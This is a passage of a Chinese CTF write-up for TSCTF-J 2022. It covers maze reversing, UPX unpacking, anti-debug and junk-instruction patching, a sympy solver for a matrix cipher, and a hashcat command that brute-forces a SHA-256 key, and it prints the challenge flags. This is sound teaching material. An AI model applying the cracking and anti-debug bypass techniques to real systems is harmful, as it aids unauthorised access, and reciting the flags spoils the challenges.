"|  |  |  |  |  |           |     |  |     |     |  |  |        |  |           |  |     |  |", 
"+  +  +  +  +  +--+--+--+--+  +  +--+--+  +  +  +  +  +--+--+--+  +--+--+--+  +  +  +--+  +", 
"|     |  |           |        |           |  |  |  |     |     |  |     |     |        |  |", 
"+  +--+  +--+--+--+  +  +  +--+--+--+--+--+  +  +  +--+  +  +  +  +--+  +  +--+--+--+--+  +", 
"|  |     |           |  |  |        |        |     |  |     |     |     |                 |", 
"+  +  +--+--+--+--+  +  +  +  +--+  +--+  +--+--+  +  +--+--+--+--+  +--+--+--+--+--+--+  +", 
"|  |        |     |  |  |  |  |  |     |     |     |           |                       |  |", 
"+  +--+--+  +  +  +--+  +--+  +  +--+  +  +  +  +--+  +--+--+--+  +--+--+--+--+  +--+--+  +", 
"|  |     |     |     |           |     |  |  |        |           |     |     |        |  |", 
"+  +--+  +--+--+  +  +--+--+--+--+  +--+--+  +--+  +--+  +--+--+--+  +  +  +  +--+--+  +  +", 
"|        |     |  |     |           |        |  |  |     |           |  |  |     |  |     |", 
"+--+--+  +  +  +--+  +  +  +--+--+--+  +  +--+  +  +  +--+--+--+  +--+  +  +  +  +  +--+--+", 
"|  |     |  |     |  |  |        |     |  |        |              |  |  |  |  |  |  |     |", 
"+  +  +--+  +--+  +--+  +  +--+  +--+  +  +--+--+--+--+--+--+--+--+  +  +--+  +  +  +  +  +", 
"|     |  |     |        |     |     |  |  |              |           |        |  |     |  |", 
"+  +--+  +--+  +--+--+--+--+  +--+  +  +  +  +--+--+--+  +  +  +--+--+--+--+--+  +--+  +  +", 
"|  |        |              |  |     |  |  |  |        |     |              |  |     |  |  |", 
"+  +--+  +  +--+--+--+--+  +--+  +--+--+  +  +  +--+--+  +--+--+  +--+  +  +  +--+  +--+  +", 
"|        |              |     |        |  |  |  |     |  |     |  |  |  |     |     |     |", 
"+  +--+--+--+--+--+--+--+--+  +  +--+  +  +  +  +  +  +--+  +  +  +  +  +--+  +  +--+  +--+", 
"|  |                          |     |  |     |  |  |        |  |     |     |  |  |        |", 
"+  +  +--+--+--+--+--+  +--+--+--+--+  +--+  +  +  +--+--+--+  +--+  +--+  +--+  +  +--+  +", 
"|  |           |  |     |           |     |     |  |        |     |     |        |  |     |", 
"+  +--+--+--+  +  +  +--+  +--+--+  +--+  +--+--+  +--+  +  +--+  +--+  +--+--+--+  +  +--+", 
"|        |  |  |     |     |     |     |  |     |        |     |     |  |     |     |     |", 
"+--+--+  +  +  +--+--+  +--+  +  +--+  +  +  +  +  +--+--+--+  +--+  +  +--+  +  +--+--+  +", 
"|     |     |     |        |  |        |  |  |     |     |     |  |  |     |        |     |", 
"+  +--+--+  +--+  +  +--+--+  +--+--+--+  +  +--+--+  +  +  +--+  +  +--+  +--+--+  +  +--+", 
"|  |     |  |  |  |  |        |        |     |        |  |        |  |  |        |  |     |", 
"+  +  +  +  +  +  +  +--+--+--+--+  +  +--+  +  +--+--+  +--+  +--+  +  +--+--+  +--+--+  +", 
"|  |  |     |  |     |              |     |  |     |  |     |  |     |        |        |  |", 
"+  +  +--+--+  +--+--+--+  +--+--+--+--+  +  +--+  +  +--+  +--+  +--+  +--+  +--+--+  +  +", 
"|  |  |                 |  |     |        |  |     |     |     |     |     |     |     |  |", 
"+  +  +--+--+  +--+--+  +  +  +--+  +--+--+--+  +--+  +--+--+  +--+  +--+  +  +--+  +--+  +", 
"|              |           |                    |                    |     |            EE|", 
"+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+", 
};
int minsiz = 0x7f7f7f7f;
char rd[2333];
void dfs(int nx, int ny, int lx, int ly, int len)
{
	if (nx >= 61 || nx < 0 || ny >= 91 || ny < 0) return;
	if (mp[nx][ny] == 'E')
	{
		if (len <= minsiz)
		{
			minsiz = len;
			cout << len << ": ";
			for (int i = 0; i < len; ++i) putchar(rd[i]);
			putchar('\n');
		}
		return;
	}
	if ((nx - 2 != lx) && mp[nx - 1][ny] == ' ') rd[len] = 'W', dfs(nx - 2, ny, nx, ny, len + 1);
	if ((nx + 2 != lx) && mp[nx + 1][ny] == ' ') rd[len] = 'S', dfs(nx + 2, ny, nx, ny, len + 1);
	if ((ny - 3 != ly) && mp[nx][ny - 1] == ' ') rd[len] = 'A', dfs(nx, ny - 3, nx, ny, len + 1);
	if ((ny + 3 != ly) && mp[nx][ny + 2] == ' ') rd[len] = 'D', dfs(nx, ny + 3, nx, ny, len + 1);
}
int main()
{
	dfs(1, 1, -10, -10, 0);
	return 0;
}
```

#### 0x02 关于混淆

对混淆感兴趣的师傅们可以大致看一下。这里先给出本题的源码帮助师傅们理解虚假控制流的效果。

```cpp
#include <stdio.h>
#include <string.h>
char mp[23333] = "+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+|     |        |                                         |           |                 |  |+  +  +  +--+  +  +--+--+  +  +--+--+--+--+  +--+--+--+--+  +--+  +  +--+  +  +--+--+  +  +|  |        |     |  |     |  |        |     |        |     |  |  |     |  |  |     |     |+--+--+--+  +--+--+  +  +  +--+  +--+  +--+  +  +--+  +  +--+  +  +--+  +--+  +--+  +--+  +|     |     |        |  |  |     |  |     |  |  |     |  |     |     |  |     |        |  |+  +  +--+  +--+--+  +  +--+  +--+  +--+  +--+  +  +  +  +  +--+--+  +  +  +--+  +  +--+  +|  |     |        |  |  |     |     |  |        |  |  |  |        |  |     |     |  |     |+  +--+  +--+--+  +  +  +  +--+  +  +  +--+--+--+  +  +  +--+  +--+  +--+--+  +--+  +  +--+|     |  |        |  |  |        |  |     |     |  |  |     |     |     |        |  |  |  |+--+  +  +--+  +--+  +  +--+--+--+  +  +  +  +  +  +--+--+  +--+  +--+  +--+  +  +--+  +  +|     |     |  |     |           |  |  |  |  |  |                 |  |     |  |     |  |  |+  +--+--+  +  +  +  +--+--+  +  +  +  +  +  +--+--+--+  +--+--+  +  +--+  +--+  +  +  +  +|     |  |  |     |        |  |  |  |  |     |        |  |     |  |     |     |  |  |     |+--+  +  +  +--+--+--+--+  +  +--+  +  +--+--+  +--+  +--+  +  +  +  +  +--+  +--+  +--+  +|        |     |           |     |     |        |     |     |  |     |     |  |     |     |+  +--+--+--+  +  +--+--+--+--+  +--+  +  +--+--+  +--+  +--+  +--+--+--+--+  +  +--+  +--+|     |        |           |  |  |     |  |     |  |     |                    |        |  |+--+  +  +--+--+--+--+--+  +  +  +  +--+  +  +--+  +  +--+--+--+--+--+  +--+--+--+  +--+  +|     |  |              |     |     |     |        |     |        |     |        |        |+  +--+  +  +--+  +  +--+--+  +--+--+  +--+  +--+--+--+  +  +--+  +--+--+  +--+  +  +--+--+|  |     |  |  |  |  |        |     |     |     |     |     |  |           |     |  |     |+  +  +--+  +  +  +  +  +--+--+  +  +--+  +--+  +  +  +  +--+  +--+--+  +--+  +--+  +  +  +|  |     |  |  |  |  |  |        |  |     |  |     |  |  |     |     |     |     |  |  |  |+  +--+  +  +  +  +--+  +  +--+--+  +  +--+  +--+--+  +  +--+  +  +  +--+--+--+  +--+  +  +|  |  |  |  |  |           |     |  |     |     |  |  |        |  |           |  |     |  |+  +  +  +  +  +--+--+--+--+  +  +--+--+  +  +  +  +  +--+--+--+  +--+--+--+  +  +  +--+  +|     |  |           |        |           |  |  |  |     |     |  |     |     |        |  |+  +--+  +--+--+--+  +  +  +--+--+--+--+--+  +  +  +--+  +  +  +  +--+  +  +--+--+--+--+  +|  |     |           |  |  |        |        |     |  |     |     |     |                 |+  +  +--+--+--+--+  +  +  +  +--+  +--+  +--+--+  +  +--+--+--+--+  +--+--+--+--+--+--+  +|  |        |     |  |  |  |  |  |     |     |     |           |                       |  |+  +--+--+  +  +  +--+  +--+  +  +--+  +  +  +  +--+  +--+--+--+  +--+--+--+--+  +--+--+  +|  |     |     |     |           |     |  |  |        |           |     |     |        |  |+  +--+  +--+--+  +  +--+--+--+--+  +--+--+  +--+  +--+  +--+--+--+  +  +  +  +--+--+  +  +|        |     |  |     |           |        |  |  |     |           |  |  |     |  |     |+--+--+  +  +  +--+  +  +  +--+--+--+  +  +--+  +  +  +--+--+--+  +--+  +  +  +  +  +--+--+|  |     |  |     |  |  |        |     |  |        |              |  |  |  |  |  |  |     |+  +  +--+  +--+  +--+  +  +--+  +--+  +  +--+--+--+--+--+--+--+--+  +  +--+  +  +  +  +  +|     |  |     |        |     |     |  |  |              |           |        |  |     |  |+  +--+  +--+  +--+--+--+--+  +--+  +  +  +  +--+--+--+  +  +  +--+--+--+--+--+  +--+  +  +|  |        |              |  |     |  |  |  |        |     |              |  |     |  |  |+  +--+  +  +--+--+--+--+  +--+  +--+--+  +  +  +--+--+  +--+--+  +--+  +  +  +--+  +--+  +|        |              |     |        |  |  |  |     |  |     |  |  |  |     |     |     |+  +--+--+--+--+--+--+--+--+  +  +--+  +  +  +  +  +  +--+  +  +  +  +  +--+  +  +--+  +--+|  |                          |     |  |     |  |  |        |  |     |     |  |  |        |+  +  +--+--+--+--+--+  +--+--+--+--+  +--+  +  +  +--+--+--+  +--+  +--+  +--+  +  +--+  +|  |           |  |     |           |     |     |  |        |     |     |        |  |     |+  +--+--+--+  +  +  +--+  +--+--+  +--+  +--+--+  +--+  +  +--+  +--+  +--+--+--+  +  +--+|        |  |  |     |     |     |     |  |     |        |     |     |  |     |     |     |+--+--+  +  +  +--+--+  +--+  +  +--+  +  +  +  +  +--+--+--+  +--+  +  +--+  +  +--+--+  +|     |     |     |        |  |        |  |  |     |     |     |  |  |     |        |     |+  +--+--+  +--+  +  +--+--+  +--+--+--+  +  +--+--+  +  +  +--+  +  +--+  +--+--+  +  +--+|  |     |  |  |  |  |        |        |     |        |  |        |  |  |        |  |     |+  +  +  +  +  +  +  +--+--+--+--+  +  +--+  +  +--+--+  +--+  +--+  +  +--+--+  +--+--+  +|  |  |     |  |     |              |     |  |     |  |     |  |     |        |        |  |+  +  +--+--+  +--+--+--+  +--+--+--+--+  +  +--+  +  +--+  +--+  +--+  +--+  +--+--+  +  +|  |  |                 |  |     |        |  |     |     |     |     |     |     |     |  |+  +  +--+--+  +--+--+  +  +  +--+  +--+--+--+  +--+  +--+--+  +--+  +--+  +  +--+  +--+  +|              |           |                    |                    |     |              |+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+";
char rd[2333];
int main()
{
	printf("Welcome To TSCTF-J 2022!!!\n");
	printf("Lets Go Out Of The MAZE!!!\n");
	int st = 92;
	scanf("%s", rd);
	if (strlen(rd) > 196)
	{
		printf("Wrong Path, Maybe it's not the best solution.");
		return 0; 
	}
	int i;
	for (i = 0; i < strlen(rd); ++i)
	{
		switch (rd[i])
		{
			case 'W':
				if (mp[st - 91] != ' ')
				{
					printf("Wrong Path");
					return 0; 
				}
				st -= 182;
				break;
			case 'S':
				if (mp[st + 91] != ' ')
				{
					printf("Wrong Path");
					return 0; 
				}
				st += 182;
				break;
			case 'A':
				if (mp[st - 1] != ' ')
				{
					printf("Wrong Path");
					return 0; 
				}
				st -= 3;
				break;
			case 'D':
				if (mp[st + 2] != ' ')
				{
					printf("Wrong Path");
					return 0; 
				}
				st += 3;
				break;
			default:
				printf("Wrong Format");
				return 0;
		}
		if (st < 0 || st > 5550)
		{
			printf("Wrong Path");
			return 0;
		} 
	}
	if (st == 5457)
	{
		printf("Good Job! The Flag is TSCTF-J{(MD5 32 Upper of Your Input)}");
	}
	else
	{
		printf("Wrong Path");
	}
	return 0;
}
```

这里给出混淆脚本(-199)：

[BogusControlFlow.cpp](https://paste.ubuntu.com/p/6wv3gSQp7b/)


[Utils.cpp](https://paste.ubuntu.com/p/G3XKDjMDTk/)


[Utils.h](https://paste.ubuntu.com/p/74ctd3pcT2/)


[SplitBasicBlock.h](https://paste.ubuntu.com/p/XHtpQRRTdG/)

可以考虑用 angr 去混淆，建议的参考学习链接：https://bbs.pediy.com/thread-266005.htm

### Thunder_air

解压后打开exe文件发现没法运行，用010editor打开发现有hint：

![](https://md.byr.moe/uploads/upload_b8abf6cbadaa1ffbdb63927314860f7f.png)


根据提示，PE头信息有问题，这是一个I386平台的程序，我们需要修改文件的PE头信息，随便搜索一篇介绍PE LOADER的博客（比如[出题人的blog](https://www.cnblogs.com/THRANDUil/p/16464284.html)），然后找到machine code，发现Intel 386平台对应的机器码是0x4c01，但是这里是0x0200，**改掉然后把MZ前面的内容删掉**即可。

![](https://md.byr.moe/uploads/upload_a3dea875fa4973253793bbbd1a206751.png)


![](https://md.byr.moe/uploads/upload_c82a470b8187e93e724b6e4771f5ebbc.png)


运行发现是打飞机游戏，但是需要击落1000000架飞机才通关（不要尝试用Cheat Engine或者修改四个.in文档改变飞机大小），用ida打开，定位到关键代码，发现有花指令，patch掉即可，得到C代码

![](https://md.byr.moe/uploads/upload_61b2e3014754760a1f914cb92e4a67a9.png)


如图，把100000，Sleep，IsDebuggerPresent**全给patch掉**，然后**Apply patches to input file**，动调可以得到一串64位字符串。这里由于出题人偷懒且傻逼从网上copy了一个base64的变表，忘记改了，导致被某师傅直接贴到cyberchef里靠着历史记录跟本题的表一模一样给非预期了😅，出题人已🔪

![](https://md.byr.moe/uploads/upload_48a95c539800b10c341314cb9c8a040d.png)


一眼Base64换表，显然`sub_470DA4`是加密函数，点进去发现第二个花指令，修复以后得到加密函数

![](https://md.byr.moe/uploads/upload_d55e3ef4ee4ca3226208eed9d554eb7b.png)


注意base64之后进行了一简单异或，解出来是`PjU3Pa8EZT1MHnA9xP6SLYQeH0zTrgNAqYz7LucwU3jGrOROqjN1eP6TS0OMRrO=`，base64换表解密

![](https://md.byr.moe/uploads/upload_734a678b9d2630482907b1db0613b444.png)


得到flag`TSCTF-J{3nj0y_P1@Ylng_ThuNd3r_41r_B4tTle_g@m3!}`



### upx_revenge

#### 0x01 脱壳

查壳的时候会发现是 UPX 壳，但 IDA 中给出的相关信息是 VPX 

>Info: This file is packed with the VPX executable packer http://upx.sf.net
>
>VPX 3.95 Copyright (C) 1996-2018 the VPX Team. All Rights Reserved.

UPX 工具无法一键脱壳，这时已经可以想到出题人把壳中有关 UPX 的字串全改成了 VPX ，用 010 Editor 全改回去就可以工具脱壳了，也可以考虑手动脱壳，但无法使用 Ollydbg 等工具，可能会比较痛苦。

#### 0x02 关于混淆

混淆为 Rimao 学长加的修改后的控制流平坦化，这里贴出学长对采用的混淆的讲解：https://bbs.pediy.com/thread-274778.htm

（反正我现在还不会去这个混淆）

考虑最原始的手段：动态调试 + 静态分析，还原代码逻辑。

这里放出源码，供各位师傅们复现的时候比对

```cpp
#include <iostream>
#include <cstring>
using namespace std;

void matrix_mul(unsigned long long *A, unsigned long long *B,unsigned long long *C,int N){
	//C = A*B
    for (short i = 0; i < N; i++) {
        for (short j = 0; j < N; j++) {
            C[N*i+j] = 0;
            for (short k = 0; k < N; k++) {
                C[N*i+j] += (A[N*i+k])*(B[N*k+j]);
            }
        }
    }
}

unsigned char dict[256] = { 25, 27, 5, 178, 36, 206, 119, 124, 126, 156, 34, 101, 244, 235, 190, 85, 216, 196, 44, 184, 62, 61, 111, 182, 189, 140, 57, 72, 203, 56, 115, 12, 106, 59, 129, 159, 125, 43, 103, 26, 210, 64, 252, 53, 211, 214, 65, 150, 86, 172, 107, 173, 133, 174, 162, 141, 66, 47, 215, 35, 84, 113, 10, 139, 30, 171, 197, 122, 114, 75, 236, 195, 246, 37, 137, 117, 245, 89, 255, 23, 148, 243, 48, 108, 231, 54, 100, 31, 105, 40, 46, 166, 99, 208, 50, 22, 8, 248, 32, 200, 143, 130, 238, 16, 253, 151, 109, 98, 58, 15, 198, 1, 11, 227, 192, 17, 88, 39, 13, 45, 90, 68, 29, 80, 230, 3, 38, 165, 110, 241, 158, 175, 116, 69, 127, 73, 102, 20, 9, 6, 181, 249, 177, 18, 77, 242, 123, 49, 93, 250, 134, 7, 254, 239, 224, 204, 160, 142, 92, 223, 120, 179, 186, 191, 247, 112, 180, 176, 219, 163, 229, 24, 207, 97, 135, 202, 155, 76, 55, 154, 145, 168, 169, 146, 87, 82, 237, 167, 121, 81, 161, 132, 60, 4, 96, 164, 21, 74, 225, 71, 218, 212, 79, 128, 170, 153, 157, 188, 70, 41, 51, 233, 147, 201, 118, 0, 138, 83, 52, 217, 240, 193, 220, 221, 19, 144, 183, 78, 95, 209, 226, 251, 185, 222, 232, 94, 42, 199, 63, 91, 67, 152, 131, 194, 2, 205, 213, 234, 149, 228, 104, 14, 187, 28, 33, 136 };
unsigned long long A0[16];
unsigned long long B0[16] = { 16,5,9,4,2,11,7,14,3,10,6,15,13,8,12,1 };
unsigned long long D0[16] = { 24,118,2,233,164,0,8,53,116,32,2,185,90,199,111,111 };
unsigned long long T0[16]; // temp
unsigned long long T1[16]; // temp
unsigned long long k = 15431;
unsigned long long vec[] = { 1,-1,0,2,0,0,0,0,0,0,0,0,0,0,0,0 };
unsigned long long enc[] = { 1734349686721832,15757252140869714,1092678154813168,9927501567100490,3808107480864345,671156288906057,5502646392645447,969808735442127,31519839691376038,46407861949122087,50371895260285662,74164462406703435,18361403837770193,28199216860800284,9248795116216354,14204238250162461 };
//TSCTF-J{651f31a7-5c6f-4ee4-a435-accb084dffb7}
int main(int argc, char *argv[])
{
    char input[80];
    scanf("%s", input);
    if (input[0] != 'T' || input[1] != 'S' || input[2] != 'C' || input[3] != 'T' || input[4] != 'F' || input[5] != '-' || input[6] != 'J' || input[7] != '{' || input[16] != '-' || input[21] != '-' || input[26] != '-' || input[31] != '-' || strlen(input) != 45 || input[44] != '}')exit(0);
    short j = 0; int tmp = 0;
    for(int i=0;i<16;i++){
        sscanf(&input[8+2*i+j], "%2x",&tmp);
        A0[i] = dict[tmp]^0x35;
        if (i == 3 || i == 5 || i == 7 || i == 9)j++;
    }
    
    for (int i = 0; i < 4; i++) {
        matrix_mul(&B0[4*i], &A0[4*i], &T0[4*i], 2);
        matrix_mul(&T0[4*i], &A0[4*i], &T1[4*i], 2);
        matrix_mul(&T1[4*i], &D0[4*i], &T0[4*i], 2);
        matrix_mul(&T0[4*i], &T0[4*i], &T1[4*i], 2);
        for (int j = 0; j < 4; j++) {
            T1[4*i+j] -= k*B0[4*i+j];
            T1[4*i+j] /= 2;
        }
    }


    for (int i = 0; i < 16; i++) {
		if (enc[i] != T1[i])exit(0);
    }
    printf("Your Input is Correct.\n");
    return 0;
}
```


#### 0x03 分析逻辑

很明显前面是输入并判断flag的格式

![](https://md.byr.moe/uploads/upload_a9e440cc872ec0a42c69225924f69f98.png)

input2 和 input 实际是相邻的，v3 为 long 类型，可以看出这里在转换为 long 类型并保存

![](https://md.byr.moe/uploads/upload_abbbae6b7561fd513750611b1665cb81.png)

将一些变量转换为 qword 方便分析。可以看出下图为加密验证

![](https://md.byr.moe/uploads/upload_5bb459dcd56e2e7e7c697d1c6caa62a9.png)

循环开始部分通过动调或其他方式很容易可以看出是 2x2 矩阵的乘法运算，函数的第三个参数为输出的矩阵，且循环每次只输出四个，正好是 2x2 的矩阵乘法。修改常量名称后很容易能得到加密表达式。

![](https://md.byr.moe/uploads/upload_037679d4e993eeaa5213ff80f2f0f06a.png)

程序将输入的 uuid 提取转换为 4x4 的矩阵，假设这个矩阵为 A，加密结果为 E，那么满足以下式子，其中 C、D为常量矩阵，k 为常量。由于全程运算都为正整数，所以除二后为向下取整

$$
\begin{align*}
&E=\lfloor((BA^2C)^2-kD)/2\rfloor
\end{align*}
$$

由于除二后向下取整，所以需要通过爆破$16 * 4 = 64$次可能，量级非常小。由矩阵平方可以写出四元二次方程组，有四组解，根据题目选择正整数解，爆破时若发现没正整数解，便跳过进行下一轮爆破。

由于是一个数学题，可以考虑使用 sympy 进行求解。

```python3
from sympy import *

a = Symbol('a');
b = Symbol('b');
c = Symbol('c');
d = Symbol('d')
B0 = [16, 5, 9, 4, 2, 11, 7, 14, 3, 10, 6, 15, 13, 8, 12, 1]
D0 = [24, 118, 2, 233, 164, 0, 8, 53, 116, 32, 2, 185, 90, 199, 111, 111]
K = 15431
my_dict = [25, 27, 5, 178, 36, 206, 119, 124, 126, 156, 34, 101, 244, 235, 190, 85, 216, 196, 44, 184, 62, 61, 111, 182,
           189, 140, 57, 72, 203, 56, 115, 12, 106, 59, 129, 159, 125, 43, 103, 26, 210, 64, 252, 53, 211, 214, 65, 150,
           86, 172, 107, 173, 133, 174, 162, 141, 66, 47, 215, 35, 84, 113, 10, 139, 30, 171, 197, 122, 114, 75, 236,
           195, 246, 37, 137, 117, 245, 89, 255, 23, 148, 243, 48, 108, 231, 54, 100, 31, 105, 40, 46, 166, 99, 208, 50,
           22, 8, 248, 32, 200, 143, 130, 238, 16, 253, 151, 109, 98, 58, 15, 198, 1, 11, 227, 192, 17, 88, 39, 13, 45,
           90, 68, 29, 80, 230, 3, 38, 165, 110, 241, 158, 175, 116, 69, 127, 73, 102, 20, 9, 6, 181, 249, 177, 18, 77,
           242, 123, 49, 93, 250, 134, 7, 254, 239, 224, 204, 160, 142, 92, 223, 120, 179, 186, 191, 247, 112, 180, 176,
           219, 163, 229, 24, 207, 97, 135, 202, 155, 76, 55, 154, 145, 168, 169, 146, 87, 82, 237, 167, 121, 81, 161,
           132, 60, 4, 96, 164, 21, 74, 225, 71, 218, 212, 79, 128, 170, 153, 157, 188, 70, 41, 51, 233, 147, 201, 118,
           0, 138, 83, 52, 217, 240, 193, 220, 221, 19, 144, 183, 78, 95, 209, 226, 251, 185, 222, 232, 94, 42, 199, 63,
           91, 67, 152, 131, 194, 2, 205, 213, 234, 149, 228, 104, 14, 187, 28, 33, 136]
flag = "flag{"


def is_positive_integer(num):
    if num < 0: return False
    s = str(num).split('.')
    if len(s) == 1: return True
    return float(s[1]) == 0


def solve_square(B):
    # A = B*B -> solve A
    global a, b, c, d
    S = eval("solve([a*a+b*c-%d, a*b+b*d-%d, a*c+c*d-%d, b*c+d*d-%d], [a,b,c,d])" % (B[0], B[1], B[2], B[3]))
    for s in S:
        s = [float(item) for item in list(s)]
        if is_positive_integer(s[0]) and is_positive_integer(s[1]) and is_positive_integer(
                s[2]) and is_positive_integer(s[3]):
            return s
    return None


def solve_inv(B, C):
    # A*B = C -> solve A
    global a, b, c, d
    S = eval("solve([%d*a+%d*b-%d, %d*a+%d*b-%d, %d*c+%d*d-%d, %d*c+%d*d-%d], [a,b,c,d])" % (
    B[0], B[2], C[0], B[1], B[3], C[1], B[0], B[2], C[2], B[1], B[3], C[3]))
    A = [float(S[item]) for item in [a, b, c, d]]
    if not is_positive_integer(A[0]): return None
    return [int(item) for item in A]


def solve_inv2(A, C):
    # A*B = C -> solve B
    global a, b, c, d
    S = eval("solve([%d*a+%d*c-%d, %d*b+%d*d-%d, %d*a+%d*c-%d, %d*b+%d*d-%d], [a,b,c,d])" % (
    A[0], A[1], C[0], A[0], A[1], C[1], A[2], A[3], C[2], A[2], A[3], C[3]))
    A = [float(S[item]) for item in [a, b, c, d]]
    if not is_positive_integer(A[0]): return None
    return [int(item) for item in A]


def solve_other(B, index, add="0000"):
    # (A-D)/2 = B -> solve A
    global B0, K
    C = [0, 0, 0, 0]
    for i in range(4):
        C[i] = B[i] * 2 + int(add[i]) + K * B0[4 * index + i]
    return C


def solve_once(B, index):
    global my_dict, flag
    for i in range(16):
        print("Trying part %d.%d" % (index + 1, i))
        s = solve_other(B, index, add=bin(i)[2:].zfill(4))
        s = solve_square(s)
        if s == None: continue  # skip not integer
        s = solve_inv(D0[4 * index:4 * index + 4], s)
        if s == None: continue
        s = solve_inv2(B0[4 * index:4 * index + 4], s)
        if s == None: continue
        s = solve_square(s)
        if s == None: continue
        s = [my_dict.index(item ^ cipher) for item in s]
        s = "".join([hex(t)[2:] for t in s])
        flag += s;
        print(flag)
        return


import time

start = time.time()
data = [1734349686721832, 15757252140869714, 1092678154813168, 9927501567100490, 3808107480864345, 671156288906057,
        5502646392645447, 969808735442127, 31519839691376038, 46407861949122087, 50371895260285662, 74164462406703435,
        18361403837770193, 28199216860800284, 9248795116216354, 14204238250162461]
for i in range(4):
    solve_once(data[4 * i:4 * i + 4], i)
print(flag + "}")
print(time.time() - start)
```



## CRYPTO

### Nonograms

&emsp;&emsp;题如其名，经典的数图游戏玩法。题目附件中给出了玩法示例，按照数字提示，填空画图即可得到flag。
&emsp;&emsp;画图需要消耗一些时间，我建议的方法是使用`画图——>颜色填充工具`或者使用`在线像素画网站`[https://tools.kooriookami.top/#/pixel-art](https://tools.kooriookami.top/#/pixel-art)

![](https://md.byr.moe/uploads/upload_7ae137692529bb458e5e045206bc2ab8.png)



最终flag为:**TSCTF-J{旗开得勝！}**

&emsp;&emsp;其实在提交flag时，TSCTF-J{旗开得勝！}和TSCTF-J{旗开得勝!}两种版本都可以通过，也就是说使用半角感叹号和全角感叹号均可，因为不想在这个地方卡人。

&emsp;&emsp;不过出题人还是留了一手，如果画出了前一、两个字，结合题目提示，很容易猜测到**旗开得胜**这个成语（实际上你猜对了，但也没完全对），因为最后一个**勝**字是**胜**的繁体。

&emsp;&emsp;其实出题人也不是故意为难大家，只是想告诉大家：**纸上得来终觉浅，绝知此事要躬行**。理论和经验往往可以帮助我们更快地做出判断、完成任务，然而实际情况往往纷繁复杂、不按常理出牌，执着地坚持到底，才有可能**守得云开见月明**。


### Two Keys

&emsp;&emsp;一共有两个密钥`key`和`KEY`，分别对应了`Question1`和`Question2`的解。后续放出的两个hint已经提示得相当清晰了:

hint1：Do you know Catalan Number?

hint2：Do you know Hashcat?

考点是**卡特兰数**和**hash爆破**。

Question1是一个最为典型的**卡特兰数**问题，卡特兰数的通项公式如下：

$$
\frac{1}{n+1}C_{2n}^{n}
$$

当n=11时，代入可得key = 58786

![](https://md.byr.moe/uploads/upload_c710a11f789b908877e63cb807b33d30.png)


Question2考察了这样一个hash爆破问题：
```python=3.9
KEY is a string of 8 lowercase letter.
sha256(KEY) == 2b87ea3983c646fcecc476f6930c18bf75935cab40471930f560bef2f370b82e 
and len(KEY) == 8
```

预期解是使用一些工具，例如**hashcat**，我们只需要在电脑上安装该工具，然后输入以下命令：
```
hashcat -m 1400 -a 3 2b87ea3983c646fcecc476f6930c18bf75935cab40471930f560bef2f370b82e ?l?l?l?l?l?l?l?l
```

![](https://md.byr.moe/uploads/upload_0027244757745f602c82b99e0dc70b62.png)

只需要等待大概半分钟左右的时间（这里启用了显卡加速，显卡型号为已经out的RTX2060），我们就可以得到第二个密钥KEY = "vmefifty"。

自己编写适当的脚本进行爆破也是预期解，当然在赛场上也出现了这样的非预期解：
![](https://md.byr.moe/uploads/upload_688bcdd2e65c4fea9c96b8086210ae0e.png)

![](https://md.byr.moe/uploads/upload_dbaad149ce1488085e75d1bce1039d25.jpg)

![](https://md.byr.moe/uploads/upload_895d36bf94d97b54250cb324f73a49e2.jpg)


富哥使用钞能力，直接v100拿下。感觉不如v我（doge




得到两个密钥之后，我们就可以美滋滋地去解密密文，获取flag啦！

最终的exp如下：

```python
from Crypto.Util.number import *
from Crypto.Cipher import DES
import hashlib
import gmpy2
import math

key = 58786
KEY = "vmefifty"

p = 0xb35c9cff71660f5b9d56b10956a3ae52ae547914d4bfbd801bd08e4a95f0e80fb40224a266c3adf45cdd6327c3b01c269692557e412a8e3e2f4370aa3acaf7cffa48010a8cc333862336e85d7ff5387ab503cc9ece97608587884ddc6ca4cd52477abc44168415f92746566f07ab38877d21a03d8b95e4e4f4d58a56614bf879
q = 0xaefd1ce2dfee9240867bb8cace347dcabe974219232206be850202f37771d9876434595f9562b796a5848b0fa2f2fbcc7b987bb6f003c65c2708a7aca8db4536f9040ae5b8bf68a392835affc003fdd111584662907514de01b430e4789b15dffbb9cd8875832a8f4fdb34cbc4bae7b52df68c8e016c15c3f8b7697c0420f829
n = 0x7a9a4979dd59cd8b38706b0920ffc1d63ee9c6c94cc6bf097c0957d5017b6562d7b03f396b9cd1f9e6a7303522effe632422c44360c66fe8526ff997db1496f2c1a70ab179f59f5fc4b1dd5513cc663d811b50e1c2b29dfa1ae5228b1fd2b7b65595c4486eb3d22fbd2b6fba58b4f299f07a73fc90e97af9781156afb0af32a02a4a1198b734fa2fefdfd64d2767e095db30919a6cbf3de0217f949d9b46e704a3cefe3af62fdfdd702e439ef423e7582d6b67903a1c956d1d7f3a62baa217f2c47d81c08f9734eb19f13c9bcd3d55c098498af02aa4dc5449668682a150050675d0b74e9dfb2698031dcbd726da450c62f48a4b24ab2da2d8bd2b1421000361
phi = 0x7a9a4979dd59cd8b38706b0920ffc1d63ee9c6c94cc6bf097c0957d5017b6562d7b03f396b9cd1f9e6a7303522effe632422c44360c66fe8526ff997db1496f2c1a70ab179f59f5fc4b1dd5513cc663d811b50e1c2b29dfa1ae5228b1fd2b7b65595c4486eb3d22fbd2b6fba58b4f299f07a73fc90e97af9781156afb0af329ec7f057b665e05893cc0d6c79028fb4786e44d66c74dd79a180ad035f8de4256d8b988038fa097a526dcc55678d80cf651b40965b08ee40d2c733220bd6fbdaebd13175d04a1498c16436f93e8d441f74d1ed77eecb9866f0c02a07c1bc1021d4329c2d8211f3e60f8bfc409c5a7424cfb7dc5d7f97a932f9eb303741bb9312c0
e = key // 2
d = gmpy2.invert(e, phi)

